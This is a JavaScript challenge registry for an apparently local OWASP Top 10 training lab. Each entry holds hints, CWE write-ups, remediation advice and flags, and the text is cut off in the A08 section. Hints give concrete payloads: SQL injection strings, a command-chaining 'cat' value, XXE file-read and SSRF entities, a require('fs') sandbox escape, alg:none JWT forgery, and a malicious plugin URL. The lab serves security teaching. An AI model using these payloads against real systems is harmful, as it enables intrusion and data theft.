'use strict';

/**
 * Central registry of every challenge in the lab.
 *
 * Each challenge has:
 *   id, category, name, difficulty, title, description, endpointHint, hints[], flag
 *   request, iterate, exploitTemplate - legacy metadata from an earlier sandbox-style UI;
 *               no longer rendered anywhere (the target app now hosts each vulnerability
 *               as a real page/feature instead), left in place harmlessly.
 *
 * Flags are hardcoded/deterministic so write-ups are reproducible across installs.
 */

const CHALLENGES = [
  // ---------------- A01: Broken Access Control ----------------
  {
    id: 'a01-easy', category: 'A01', name: 'Broken Access Control', difficulty: 'easy',
    title: 'IDOR: Peek at Someone Else\'s Profile',
    description: 'The profile API trusts the ID in the URL instead of checking who is logged in.',
    endpointHint: 'GET /api/a01/easy/profile/:id',
    hints: [
      'Check the Employee Directory feature.',
      'Register or log in with any account first from within the target application.',
      'Look up your own profile by ID, then try other IDs — what does 99 look like?',
      'The server never checks req.session.user.id against the :id in the URL — it will show you ANY profile.'
    ],
    request: { method: 'GET', path: '/api/a01/easy/profile/1', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-639: Authorization Bypass Through User-Controlled Key",
      "rootCause": "The endpoint retrieves a user record by the ID given in the URL without verifying that the requesting session actually owns that ID.",
      "impact": "Any authenticated user can enumerate and read every other user's profile data, including any fields the app considers private.",
      "remediation": "Always check the resource owner against the authenticated session before returning data. Non-sequential IDs (UUIDs) help but are not a substitute for the access check.",
      "exploitSummary": "Log in, then request the profile endpoint with IDs other than your own \u2014 the admin account's profile is returned in full."
},
    flag: 'LAB{a01_easy_idor_profile_leak}'
  },
  {
    id: 'a01-medium', category: 'A01', name: 'Broken Access Control', difficulty: 'medium',
    title: 'Missing Function-Level Access Control',
    description: 'An admin-only endpoint exists but the server checks a client-controlled header instead of your real role.',
    endpointHint: 'GET /api/a01/medium/admin/users',
    hints: [
      'The nav has an Admin Console link — see what happens when you open it.',
      'Try the feature normally first — you should get a 403.',
      'The admin check is not based on your session role at all. What request header might a lazy developer trust instead?',
      'Add a header: X-Admin: true'
    ],
    request: { method: 'GET', path: '/api/a01/medium/admin/users', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-863: Incorrect Authorization",
      "rootCause": "The admin endpoint checks a client-supplied X-Admin header instead of the authenticated session's role.",
      "impact": "Any client can access admin-only functionality simply by setting a header the server should never have trusted.",
      "remediation": "Authorization decisions must come from server-side session/role state, never from request headers or other client-controlled values.",
      "exploitSummary": "Add an X-Admin: true header to a request against the admin endpoint; access is granted with no real session check."
},
    flag: 'LAB{a01_medium_header_trust_bypass}'
  },
  {
    id: 'a01-hard', category: 'A01', name: 'Broken Access Control', difficulty: 'hard',
    title: 'Mass Assignment Privilege Escalation',
    description: 'The profile update endpoint blindly merges your entire JSON body into your user object.',
    endpointHint: 'PATCH /api/a01/hard/profile  then  GET /api/a01/hard/admin-flag',
    hints: [
      'Look at the Edit Profile page under My Account.',
      'Log in first, then try the Edit Profile form normally — it just updates your bio.',
      'The server does not restrict which fields your JSON body can touch. Your user object has a "role" field.',
      'Add "role": "admin" to the body, send it, then change the request to GET /api/a01/hard/admin-flag.'
    ],
    request: { method: 'PATCH', path: '/api/a01/hard/profile', headers: { 'Content-Type': 'application/json' }, body: '{\n  "bio": "Just a researcher."\n}' },
    writeup: {
      "cwe": "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
      "rootCause": "The profile-update handler merges the entire request body into the user object with no allow-list of editable fields.",
      "impact": "A regular user can set arbitrary fields on their own account record, including role, to escalate to admin.",
      "remediation": "Explicitly allow-list which fields a client may update; never spread or Object.assign an entire untrusted body onto a persisted model.",
      "exploitSummary": "Include \"role\":\"admin\" in the profile-update body; the field is accepted and persisted with no filtering."
},
    flag: 'LAB{a01_hard_mass_assignment_role_escalation}'
  },

  // ---------------- A02: Cryptographic Failures ----------------
  {
    id: 'a02-easy', category: 'A02', name: 'Cryptographic Failures', difficulty: 'easy',
    title: 'Sensitive Data Exposure',
    description: 'A "safe" endpoint dumps user records including a field that looks encoded but isn\'t actually protected.',
    endpointHint: 'GET /api/a02/easy/users',
    hints: [
      'The Developer Portal has an "Internal Tools" section.',
      'Send the request — look closely at the "recoveryCode" field on each user.',
      'That is not encrypted, just encoded. What common text encoding produces alphanumeric output ending in = padding?',
      'Base64-decode each recoveryCode value (browser console: atob("...")). One of them is the flag.'
    ],
    request: { method: 'GET', path: '/api/a02/easy/users', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-312: Cleartext Storage of Sensitive Information",
      "rootCause": "A field intended to be confidential is base64-encoded, which is an encoding, not encryption, and provides no confidentiality.",
      "impact": "Anyone who can read the API response can trivially recover the plaintext, defeating the field's purpose entirely.",
      "remediation": "Never treat encoding as protection. Sensitive fields should not appear in general API responses at all, and if persisted, must be properly encrypted with access-controlled decryption.",
      "exploitSummary": "Base64-decode the recoveryCode field returned by the endpoint \u2014 no cracking required."
},
    flag: 'LAB{a02_easy_base64_is_not_encryption}'
  },
  {
    id: 'a02-medium', category: 'A02', name: 'Cryptographic Failures', difficulty: 'medium',
    title: 'Weak, Unsalted Password Hashing',
    description: 'A leaked internal hash dump uses fast, unsalted MD5. Crack it and log in as admin.',
    endpointHint: 'GET /api/a02/medium/leak  then  POST /api/a02/medium/login',
    hints: [
      'Also under Developer Portal > Internal Tools — there is a leaked hash dump and a login form there.',
      'Try it normally first to see the leaked hash for user "admin".',
      'MD5 with no salt is trivially reversible for common passwords via lookup tables or hashcat/john.',
      'Once cracked, switch the request to POST /api/a02/medium/login with {"username":"admin","password":"<cracked>"}.'
    ],
    request: { method: 'GET', path: '/api/a02/medium/leak', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-916: Use of Password Hash With Insufficient Computational Effort",
      "rootCause": "Passwords are hashed with unsalted, fast MD5, designed for speed rather than resisting offline cracking.",
      "impact": "A leaked hash dump can be cracked for common passwords in seconds with commodity hardware, leading to full account takeover.",
      "remediation": "Use a slow, salted, purpose-built password hash (bcrypt, scrypt, Argon2), and never expose hash dumps outside a properly access-controlled boundary.",
      "exploitSummary": "Crack the leaked MD5 hash offline, then log in with the recovered credentials."
},
    flag: 'LAB{a02_medium_md5_no_salt_cracked}'
  },
  {
    id: 'a02-hard', category: 'A02', name: 'Cryptographic Failures', difficulty: 'hard',
    title: 'JWT "alg:none" Forgery',
    description: 'The token verifier trusts the "alg" field inside the JWT header instead of enforcing one algorithm server-side.',
    endpointHint: 'GET /api/a02/hard/token  then  GET /api/a02/hard/admin',
    hints: [
      'Developer Portal > API Access Tokens.',
      'Try it normally first to get a normal user token. Paste it into jwt.io (or decode it yourself) to see header + payload are just base64url JSON.',
      'Rebuild the token with header {"alg":"none","typ":"JWT"}, change the role claim to "admin", and drop the signature entirely — keep the trailing dot. Use jwt.io, CyberChef, or a few lines of Python to build it.',
      'Switch the request to GET /api/a02/hard/admin with header Authorization: Bearer <your forged token>.'
    ],
    request: { method: 'GET', path: '/api/a02/hard/token', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-347: Improper Verification of Cryptographic Signature",
      "rootCause": "The verifier trusts the \"alg\" field embedded in the JWT header rather than pinning one expected algorithm server-side, so a token claiming alg:none is accepted with no signature check.",
      "impact": "Anyone can forge an arbitrary, fully-trusted token \u2014 including elevated roles \u2014 without knowing any secret key.",
      "remediation": "Hardcode the expected algorithm(s) in the verifier and reject anything else outright; never derive trust decisions from attacker-controlled token metadata.",
      "exploitSummary": "Rebuild the JWT with header {\"alg\":\"none\"}, an admin role claim, and no signature segment; the admin endpoint accepts it."
},
    flag: 'LAB{a02_hard_jwt_alg_none_forged}'
  },

  // ---------------- A03: Injection ----------------
  {
    id: 'a03-easy', category: 'A03', name: 'Injection', difficulty: 'easy',
    title: 'Classic SQL Injection Login Bypass',
    description: 'The login query is built with string concatenation against a real SQLite database.',
    endpointHint: 'POST /api/a03/easy/login',
    hints: [
      'The main Sign In page.',
      'Try it normally first — normal wrong credentials, normal failure.',
      'The query looks like: SELECT * FROM users WHERE username=\'<u>\' AND password=\'<p>\'. What happens if your username value closes the quote and adds a condition that is always true?',
      "Try username: admin' -- (with a space after --) and any password."
    ],
    request: { method: 'POST', path: '/api/a03/easy/login', headers: { 'Content-Type': 'application/json' }, body: '{\n  "username": "admin",\n  "password": "wrongpassword"\n}' },
    writeup: {
      "cwe": "CWE-89: SQL Injection",
      "rootCause": "User-supplied username/password values are concatenated directly into a SQL query string.",
      "impact": "An attacker can bypass authentication entirely for any account, including admin, without knowing a password.",
      "remediation": "Use parameterized queries / prepared statements everywhere user input reaches SQL \u2014 never build queries with string concatenation.",
      "exploitSummary": "Submit a username like admin' -- so the WHERE clause always evaluates true for the admin row, bypassing the password check."
},
    flag: 'LAB{a03_easy_sqli_login_bypass}'
  },
  {
    id: 'a03-medium', category: 'A03', name: 'Injection', difficulty: 'medium',
    title: 'Blind Boolean-Based SQL Injection',
    description: 'A product search endpoint only tells you "found" or "not found" — no data is reflected. Extract a secret flag stored in another table.',
    endpointHint: 'GET /api/a03/medium/search?name=...',
    hints: [
      'The Shop has a product search box.',
      'Try it normally first — {"found":true} for a normal search term.',
      'That boolean IS your oracle. Anchor on a substring you know exists (like "Mouse") so the base match stays true, then append AND (subquery)=value.',
      'There is a hidden table called secrets with a column named value. Try: Mouse\' AND (SELECT SUBSTR(value,1,1) FROM secrets)=\'L\' -- and script the character-by-character extraction yourself (Python/Burp Intruder).'
    ],
    request: { method: 'GET', path: '/api/a03/medium/search?name=Mouse', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-89: SQL Injection (Blind)",
      "rootCause": "The same unparameterized query pattern as the login form, but only a boolean found/not-found signal is returned instead of data.",
      "impact": "An attacker can still exfiltrate arbitrary data from any table, just more slowly than a data-returning injection.",
      "remediation": "Parameterize the query; a lack of visible output does not make string-concatenated SQL safe.",
      "exploitSummary": "Anchor the search on a real substring, append a boolean subquery condition, and read found:true/false to extract a hidden flag character by character."
},
    flag: 'LAB{a03_medium_blind_sqli_extracted}'
  },
  {
    id: 'a03-hard', category: 'A03', name: 'Injection', difficulty: 'hard',
    title: 'OS Command Injection',
    description: 'A "network diagnostics" tool builds a shell command directly from your input.',
    endpointHint: 'POST /api/a03/hard/ping',
    hints: [
      'Developer Portal > Network Diagnostics.',
      'Try it normally first — a normal ping to 127.0.0.1.',
      'The server runs something like: exec(`ping -c 1 ${host}`). Shells let you chain extra commands with characters like ; or && or backticks.',
      'There is a file confidential/flag_a03_hard.txt on disk. Try host: "127.0.0.1; cat confidential/flag_a03_hard.txt"'
    ],
    request: { method: 'POST', path: '/api/a03/hard/ping', headers: { 'Content-Type': 'application/json' }, body: '{\n  "host": "127.0.0.1"\n}' },
    writeup: {
      "cwe": "CWE-78: OS Command Injection",
      "rootCause": "User input is interpolated directly into a shell command string passed to exec().",
      "impact": "Arbitrary command execution on the host with the server process's privileges \u2014 a complete compromise of the machine.",
      "remediation": "Avoid shelling out with user input; if unavoidable, use an execFile-style API with an argument array (never a shell string) plus strict input validation.",
      "exploitSummary": "Append a shell metacharacter and a second command to the host field, e.g. `; cat confidential/flag_a03_hard.txt`."
},
    flag: 'LAB{a03_hard_os_command_injection}'
  },

  // ---------------- A04: Insecure Design ----------------
  {
    id: 'a04-easy', category: 'A04', name: 'Insecure Design', difficulty: 'easy',
    title: 'Brute-Forceable Coupon Code',
    description: 'A discount coupon endpoint has no rate limiting and codes are short and numeric.',
    endpointHint: 'GET /api/a04/easy/redeem?code=####',
    hints: [
      'Shop > Redeem Coupon.',
      'Try it normally first — {"ok":false} for a wrong code.',
      'Valid codes are exactly 4 digits: 0000-9999, and there is no rate limiting at all.',
      'Script it: valid codes are 4 digits, 0000-9999, and there is no rate limiting. A curl loop or Burp Intruder will find it fast.'
    ],
    request: { method: 'GET', path: '/api/a04/easy/redeem?code=0000', headers: {}, body: '' },
    iterate: { target: 'path', placeholder: '{{X}}', mode: 'range', range: { start: 0, end: 9999, pad: 4 },
      pathTemplate: '/api/a04/easy/redeem?code={{X}}' },
    writeup: {
      "cwe": "CWE-307: Improper Restriction of Excessive Authentication Attempts",
      "rootCause": "The coupon-redemption endpoint has no rate limiting or lockout, and valid codes are short and numeric.",
      "impact": "The entire keyspace of valid codes can be exhausted in seconds to minutes, defeating the control entirely.",
      "remediation": "Rate-limit repeated failures per IP/account, and use codes with enough entropy that brute forcing is computationally infeasible regardless.",
      "exploitSummary": "Script requests across all 4-digit codes; one succeeds within the 0000-9999 range."
},
    flag: 'LAB{a04_easy_no_rate_limit_bruteforce}'
  },
  {
    id: 'a04-medium', category: 'A04', name: 'Insecure Design', difficulty: 'medium',
    title: 'Client-Trusted Price Manipulation',
    description: 'The checkout endpoint trusts a price sent by the client instead of looking it up server-side.',
    endpointHint: 'POST /api/a04/medium/checkout',
    hints: [
      'Shop > pick a product and use Buy Now.',
      'Try it normally first — a normal $499.99 checkout for item 1.',
      'The server never re-checks your submitted "price" against the real catalog price.',
      'Any order that pays under $1.00 gets a special reward. Try price: 0.'
    ],
    request: { method: 'POST', path: '/api/a04/medium/checkout', headers: { 'Content-Type': 'application/json' }, body: '{\n  "itemId": 1,\n  "price": 499.99\n}' },
    writeup: {
      "cwe": "CWE-602: Client-Side Enforcement of Server-Side Security",
      "rootCause": "The checkout endpoint trusts a price value supplied by the client instead of re-deriving it from the server-side catalog.",
      "impact": "A user can pay any amount they choose for any item, including zero, causing direct financial loss.",
      "remediation": "Never trust client-supplied pricing; always recompute business-critical values server-side at transaction time.",
      "exploitSummary": "Intercept the checkout request and change the price field to 0 before it reaches the server."
},
    flag: 'LAB{a04_medium_client_side_price_trust}'
  },
  {
    id: 'a04-hard', category: 'A04', name: 'Insecure Design', difficulty: 'hard',
    title: 'Predictable Password Reset Token',
    description: 'The forgot-password flow generates tokens with a homegrown, predictable scheme.',
    endpointHint: 'POST /api/a04/hard/forgot-password  then  POST /api/a04/hard/reset-password',
    hints: [
      'The Sign In page has a "Forgot password?" link.',
      'Try it normally first to trigger a "reset" for admin. Note the serverTimeHint in the response.',
      'The token is md5(username + a low-resolution time value). What if it is rounded to the current minute?',
      'Exact formula: token = md5(`${username}:${Math.floor(Date.now()/60000)}`). Compute it yourself (browser console, Python, or CyberChef\'s MD5 recipe) right after triggering the reset, then submit it as the token along with a new password.'
    ],
    request: { method: 'POST', path: '/api/a04/hard/forgot-password', headers: { 'Content-Type': 'application/json' }, body: '{\n  "username": "admin"\n}' },
    writeup: {
      "cwe": "CWE-330: Use of Insufficiently Random Values",
      "rootCause": "The password-reset token is derived from the username and the current time rounded to the nearest minute \u2014 both knowable or guessable.",
      "impact": "An attacker can compute a valid reset token for any account without ever intercepting an email, leading to full account takeover.",
      "remediation": "Generate reset tokens from a cryptographically secure random source, store a hash of the token server-side, and give it a short expiry.",
      "exploitSummary": "Trigger a reset, then compute md5(username:currentMinuteEpoch) yourself and submit it as the token within the same minute."
},
    flag: 'LAB{a04_hard_predictable_reset_token}'
  },

  // ---------------- A05: Security Misconfiguration ----------------
  {
    id: 'a05-easy', category: 'A05', name: 'Security Misconfiguration', difficulty: 'easy',
    title: 'Leftover Default Credentials',
    description: 'A legacy admin panel from an old deployment was never decommissioned.',
    endpointHint: 'POST /api/a05/easy/legacy-login',
    hints: [
      'Not linked from the main nav — check the page footer.',
      'Try it normally first — wrong credentials, normal failure.',
      'Old systems often ship with vendor or install-time default credentials.',
      'Try the classic pairing admin / admin123.'
    ],
    request: { method: 'POST', path: '/api/a05/easy/legacy-login', headers: { 'Content-Type': 'application/json' }, body: '{\n  "username": "admin",\n  "password": "wrongpassword"\n}' },
    writeup: {
      "cwe": "CWE-1392: Use of Default Credentials",
      "rootCause": "A legacy admin panel was left deployed with vendor/install-time default credentials that were never rotated or disabled.",
      "impact": "Trivial full administrative compromise by anyone who knows or guesses common default credential pairs.",
      "remediation": "Decommission unused legacy systems entirely; if retained, force credential rotation on first use and audit for default-credential exposure.",
      "exploitSummary": "Log in to the legacy admin endpoint with the classic admin/admin123 pairing."
},
    flag: 'LAB{a05_easy_default_credentials_still_active}'
  },
  {
    id: 'a05-medium', category: 'A05', name: 'Security Misconfiguration', difficulty: 'medium',
    title: 'Exposed Backup File',
    description: 'A static file server exposes a backup that should never have been web-accessible.',
    endpointHint: 'GET /static/backups/...',
    hints: [
      'Not linked anywhere in the app at all — this one is pure guesswork against the static file server.',
      'The default path is a guess and 404s. Misconfigured static file serving sometimes exposes files nobody linked to.',
      'Try common backup/temp naming patterns: dates, "backup", "site", "old", ".bak", ".txt".',
      'Try: /static/backups/site-backup-2024.txt'
    ],
    request: { method: 'GET', path: '/static/backups/backup.txt', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory",
      "rootCause": "A backup file was placed inside a directory served statically to the public with no access control.",
      "impact": "Anyone who discovers or guesses the file name can download internal data never meant to be public.",
      "remediation": "Never place backups, source, or config files inside a web-served directory; keep internal tooling storage outside the webroot.",
      "exploitSummary": "Guess a plausible backup filename under the static backups path and fetch it directly."
},
    flag: 'LAB{a05_medium_exposed_backup_file}'
  },
  {
    id: 'a05-hard', category: 'A05', name: 'Security Misconfiguration', difficulty: 'hard',
    title: 'Undocumented Debug Console',
    description: 'A debug expression-evaluator endpoint was left enabled and is disallowed (but listed!) in robots.txt.',
    endpointHint: 'GET /robots.txt  then  POST /api/a05/hard/debug-console',
    hints: [
      'Not linked anywhere in the UI — check what a well-behaved crawler is told to avoid (a certain text file at the site root).',
      'Try it normally first to see robots.txt — "Disallow" entries tell crawlers to stay away, but they also reveal the path exists.',
      'Switch to POST /api/a05/hard/debug-console with {"expr":"1+1"} first to confirm it evaluates JS expressions.',
      "The vm context still exposes require(). Try: require('fs').readFileSync('confidential/flag_a05_hard.txt','utf8')"
    ],
    request: { method: 'GET', path: '/robots.txt', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-489: Active Debug Code",
      "rootCause": "A debug expression-evaluator left enabled in the deployed app runs attacker input inside a Node vm context that still exposes require(), so it is not actually sandboxed.",
      "impact": "Full remote code execution, discoverable simply by reading a robots.txt disallow entry that unintentionally reveals the path.",
      "remediation": "Strip all debug/test-only endpoints before deploying anywhere shared, and never disallow-list a secret path in robots.txt \u2014 remove it from routing entirely.",
      "exploitSummary": "Read robots.txt to find the debug console path, then send an expression that reads the target file via require('fs')."
},
    flag: 'LAB{a05_hard_debug_console_rce}'
  },

  // ---------------- A06: Vulnerable and Outdated Components ----------------
  {
    id: 'a06-easy', category: 'A06', name: 'Vulnerable and Outdated Components', difficulty: 'easy',
    title: 'XXE via Outdated XML Parser',
    description: 'An old XML import feature (flagged by version banner as outdated) resolves external entities.',
    endpointHint: 'POST /api/a06/easy/import-xml',
    hints: [
      'Developer Portal > Data Import.',
      'Paste some plain XML first — it just echoes back. Check the response headers for X-Powered-By — that version banner is your clue.',
      'That parser class of vulnerability is XXE (XML External Entity) injection.',
      'Define a DOCTYPE with an external entity reading confidential/flag_a06_easy.txt and reference it in the body, e.g.: <!DOCTYPE root [ <!ENTITY xxe SYSTEM "confidential/flag_a06_easy.txt"> ]><root><data>&xxe;</data></root>'
    ],
    request: { method: 'POST', path: '/api/a06/easy/import-xml', headers: { 'Content-Type': 'application/xml' }, body: '<?xml version="1.0"?>\n<root><data>hello</data></root>' },
    exploitTemplate: '<?xml version="1.0"?>\n<!DOCTYPE root [ <!ENTITY xxe SYSTEM "confidential/flag_a06_easy.txt"> ]>\n<root><data>&xxe;</data></root>',
    writeup: {
      "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
      "rootCause": "The XML parser resolves external entities defined in a DOCTYPE, a legacy default in many older XML libraries.",
      "impact": "An attacker can read arbitrary local files the server process can access, and in more severe cases pivot to SSRF or denial of service.",
      "remediation": "Disable DTD processing and external entity resolution entirely in the XML parser configuration, and verify the setting explicitly rather than trusting defaults.",
      "exploitSummary": "Define an external entity pointing at a local file path and reference it in the document body; its contents are reflected in the parsed output."
},
    flag: 'LAB{a06_easy_xxe_outdated_parser}'
  },
  {
    id: 'a06-medium', category: 'A06', name: 'Vulnerable and Outdated Components', difficulty: 'medium',
    title: 'Insecure Deserialization Library',
    description: 'A "session import" feature deserializes a base64 blob using an old serializer that supports embedded function execution.',
    endpointHint: 'POST /api/a06/medium/import-session',
    hints: [
      'Developer Portal > Restore Saved Session.',
      'The default blob is just base64 of {"foo":"bar"} — benign, deserializes normally.',
      'This mimics real-world Node deserializers (e.g. node-serialize) that encode functions as `_$$ND_FUNC$$_function(){...}()`. If the server reconstructs and invokes a function from your input, that is code execution.',
      'Build the base64-encoded payload yourself (Python or CyberChef) so its function reads confidential/flag_a06_medium.txt.'
    ],
    request: { method: 'POST', path: '/api/a06/medium/import-session', headers: { 'Content-Type': 'application/json' }, body: '{\n  "blob": "eyJmb28iOiJiYXIifQ=="\n}' },
    writeup: {
      "cwe": "CWE-502: Deserialization of Untrusted Data",
      "rootCause": "The session-restore feature deserializes attacker-controlled data using a scheme that reconstructs and invokes embedded function definitions.",
      "impact": "Full remote code execution \u2014 deserializing untrusted data with an unsafe deserializer is functionally equivalent to running attacker-supplied code.",
      "remediation": "Never deserialize untrusted data with a format that can represent executable code; use JSON.parse for data and validate the resulting structure.",
      "exploitSummary": "Build a base64 blob whose JSON contains a specially-marked function string; the server reconstructs and executes it."
},
    flag: 'LAB{a06_medium_insecure_deserialization}'
  },
  {
    id: 'a06-hard', category: 'A06', name: 'Vulnerable and Outdated Components', difficulty: 'hard',
    title: 'XXE-to-SSRF Chain (Internal-Only Endpoint)',
    description: 'Chain the outdated XML parser\'s XXE into an SSRF that reaches a localhost-only endpoint.',
    endpointHint: 'POST /api/a06/hard/import-xml  →  reaches /internal/a06-hard-flag',
    hints: [
      'Admin > Reports (Import).',
      '/internal/a06-hard-flag only answers requests whose remote address is the server itself. You cannot reach it directly — but the vulnerable XML parser makes server-side requests on your behalf.',
      'Same XXE technique as the easy version, but the SYSTEM identifier is a URL, not a file path.',
      'Try SYSTEM "http://127.0.0.1:4010/internal/a06-hard-flag" (adjust the port if you changed it), e.g.: <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://127.0.0.1:4010/internal/a06-hard-flag"> ]><root><data>&xxe;</data></root>'
    ],
    request: { method: 'POST', path: '/api/a06/hard/import-xml', headers: { 'Content-Type': 'application/xml' }, body: '<?xml version="1.0"?>\n<root><data>hello</data></root>' },
    exploitTemplate: '<?xml version="1.0"?>\n<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://127.0.0.1:4010/internal/a06-hard-flag"> ]>\n<root><data>&xxe;</data></root>',
    writeup: {
      "cwe": "CWE-918: Server-Side Request Forgery (chained from CWE-611)",
      "rootCause": "The same XXE-vulnerable parser resolves an external entity whose SYSTEM identifier is a URL, not just a file path, letting it issue arbitrary server-side HTTP requests.",
      "impact": "An attacker can use the vulnerable server as a proxy to reach internal-only services unreachable from outside the network.",
      "remediation": "Fixing the XXE at the parser level closes this chain too; internal services should also authenticate callers rather than relying solely on network position.",
      "exploitSummary": "Point the external entity at an internal-only URL instead of a file path; the server fetches it on your behalf and reflects the response."
},
    flag: 'LAB{a06_hard_xxe_ssrf_chain}'
  },

  // ---------------- A07: Identification and Authentication Failures ----------------
  {
    id: 'a07-easy', category: 'A07', name: 'Identification & Authentication Failures', difficulty: 'easy',
    title: 'No Account Lockout / Weak Password',
    description: 'The "weakuser" account has a weak, dictionary-guessable password and there is no lockout after failed attempts.',
    endpointHint: 'POST /api/a07/easy/login',
    hints: [
      'The main Sign In page — try a different account than usual.',
      'Try it normally first — normal failure, no lockout warning at all.',
      'There is no rate limiting, delay, or lockout on this login endpoint, and the password is one of the most common in the world.',
      'Script through a common-password list (curl loop, Burp Intruder, or a quick Python script) against username weakuser.'
    ],
    request: { method: 'POST', path: '/api/a07/easy/login', headers: { 'Content-Type': 'application/json' }, body: '{\n  "username": "weakuser",\n  "password": "123456"\n}' },
    iterate: { target: 'body', placeholder: '{{X}}', mode: 'wordlist',
      wordlist: ['123456', 'password', '123456789', '12345678', '12345', 'qwerty', '111111', '123123', 'abc123', 'password1', 'iloveyou', 'admin', 'welcome', 'monkey', 'dragon', 'letmein', 'trustno1', 'sunshine', 'master', 'football'],
      bodyTemplate: '{\n  "username": "weakuser",\n  "password": "{{X}}"\n}' },
    writeup: {
      "cwe": "CWE-307 / CWE-521: No Lockout + Weak Password",
      "rootCause": "The login endpoint enforces no rate limit or lockout, and at least one account uses a password from a well-known common-password list.",
      "impact": "Accounts with weak passwords can be compromised via automated brute forcing in a very short time.",
      "remediation": "Enforce minimum password strength at registration, and add rate limiting/lockout after a small number of failed attempts.",
      "exploitSummary": "Script a small common-password wordlist against the weak account; the login endpoint never slows down or blocks the attempts."
},
    flag: 'LAB{a07_easy_no_lockout_weak_password}'
  },
  {
    id: 'a07-medium', category: 'A07', name: 'Identification & Authentication Failures', difficulty: 'medium',
    title: 'Session Fixation',
    description: 'The app accepts a session ID supplied by the client instead of always issuing a fresh one at login.',
    endpointHint: 'GET /api/a07/medium/set-session?sid=...  →  POST /api/a07/medium/admin-visits-link  →  GET /api/a07/medium/flag',
    hints: [
      'My Account > Share Access.',
      'Step 1: pick your own session id and set it via set-session?sid=....',
      'Step 2: switch to POST /api/a07/medium/admin-visits-link with {"sid":"<same value>"} — this simulates the admin clicking your link and logging in with your fixed session id.',
      'Step 3: switch to GET /api/a07/medium/flag — your browser still carries the fixed session cookie, which is now authenticated as admin.'
    ],
    request: { method: 'GET', path: '/api/a07/medium/set-session?sid=attacker-chosen-123', headers: {}, body: '' },
    writeup: {
      "cwe": "CWE-384: Session Fixation",
      "rootCause": "The application accepts a client-supplied session identifier and never issues a fresh one at authentication time.",
      "impact": "An attacker who gets a victim to authenticate using an attacker-chosen session ID inherits that now-authenticated session.",
      "remediation": "Always regenerate the session identifier immediately after any privilege change, especially login.",
      "exploitSummary": "Set your own session id, get the victim to authenticate while using it, then reuse the same id \u2014 it is now privileged."
},
    flag: 'LAB{a07_medium_session_fixation}'
  },
  {
    id: 'a07-hard', category: 'A07', name: 'Identification & Authentication Failures', difficulty: 'hard',
    title: 'MFA Step Skip Logic Flaw',
    description: 'The admin-flag endpoint checks only that you hold *a* signed token, not that its "step" claim says MFA was completed.',
    endpointHint: 'POST /api/a07/hard/login-step1  then  GET /api/a07/hard/admin-flag',
    hints: [
      'The main Sign In page.',
      'Test account: username "mfauser", password "MfaTest#2024" (role: admin, protected by MFA). Log in normally to see what happens after the password step.',
      'The intended flow is to call /api/a07/hard/verify-otp next with a code you do not have.',
      'Instead, switch the request to GET /api/a07/hard/admin-flag with header Authorization: Bearer <step1 token> — does it actually check the "step" claim?'
    ],
    request: { method: 'POST', path: '/api/a07/hard/login-step1', headers: { 'Content-Type': 'application/json' }, body: '{\n  "username": "mfauser",\n  "password": "MfaTest#2024"\n}' },
    writeup: {
      "cwe": "CWE-287: Improper Authentication (MFA Bypass)",
      "rootCause": "The protected resource only validates that a token is properly signed and carries an elevated role; it never checks the token's \"step\" claim to confirm MFA was actually completed.",
      "impact": "Multi-factor authentication is completely bypassable for any account it is supposed to protect.",
      "remediation": "Every claim that gates a security decision must be explicitly checked at every enforcement point; a partial auth flow must never issue a token indistinguishable from a fully-authenticated one.",
      "exploitSummary": "Complete only the password step, then present that step's \"pending\" token directly to the protected admin resource."
},
    flag: 'LAB{a07_hard_mfa_step_skip}'
  },

  // ---------------- A08: Software and Data Integrity Failures ----------------
  {
    id: 'a08-easy', category: 'A08', name: 'Software and Data Integrity Failures', difficulty: 'easy',
    title: 'Insecure Cookie Deserialization (eval)',
    description: 'A "prefs" cookie is decoded and passed straight into eval() instead of JSON.parse().',
    endpointHint: 'GET /api/a08/easy/prefs',
    hints: [
      'My Account > Preferences.',
      'Load your preferences normally first — you get default {"theme":"dark"} prefs.',
      'JSON.parse only ever produces data. eval() executes arbitrary JavaScript. The cookie value is base64 of whatever gets eval()\'d.',
      'Edit the "prefs" cookie yourself in your browser\'s DevTools (Application/Storage tab > Cookies), setting it to base64 of `{a: globalThis.__A08_EASY_FLAG__}` (a plain object literal, not JSON — eval accepts JS syntax) — then reload the Preferences page.'
    ],
    request: { method: 'GET', path: '/api/a08/easy/prefs', headers: {}, body: '', cookieHint: { name: 'prefs', benignValue: 'e3RoZW1lOiAiZGFyayJ9' } },
    writeup: {
      "cwe": "CWE-502: Deserialization of Untrusted Data (eval)",
      "rootCause": "A cookie value is decoded and passed to eval() instead of JSON.parse(), so it executes as JavaScript rather than being parsed as data.",
      "impact": "Server-side code execution or data exfiltration, simply by controlling a cookie value the client fully owns.",
      "remediation": "Never use eval() (or Function constructors) on any client-influenced value, including cookies; use JSON.parse and validate the resulting shape.",
      "exploitSummary": "Set the prefs cookie to base64 of a JS object literal that references a server-side global instead of plain JSON."
},
    flag: 'LAB{a08_easy_insecure_eval_deserialization}'
  },
  {
    id: 'a08-medium', category: 'A08', name: 'Software and Data Integrity Failures', difficulty: 'medium',
    title: 'Unsigned Plugin / Update Fetch',
    description: 'The app downloads "plugin" code from any URL you give it and runs it — no signature or checksum verification.',
    endpointHint: 'POST /api/a08/medium/install-plugin',
    hints: [
      'Developer Portal > Plugin Marketplace.',
      'There is no allow-list of trusted plugin sources and no integrity/signature check at all.',
      'Create a file at public/static/my-plugin.js in the project (you have full filesystem access to your own local server) containing: module.exports.run = () => require(\'fs\').readFileSync(\'confidential/flag_a08_medium.txt\',\'utf8\');',
      'Send url: "http://127.0.0.1:4010/static/my-plugin.js" (adjust port if changed).'
    ],
    request: { method: 'POST', path: '/api/a08/medium/install-plugin', headers: { 'Content-Type': 'application/json' }, body: '{\n  "url": "http://127.0.0.1:4010/static/my-plugin.js"\n}' },
    writeup: {
      "cwe": "CWE-494: Download of Code Without Integrity Check",
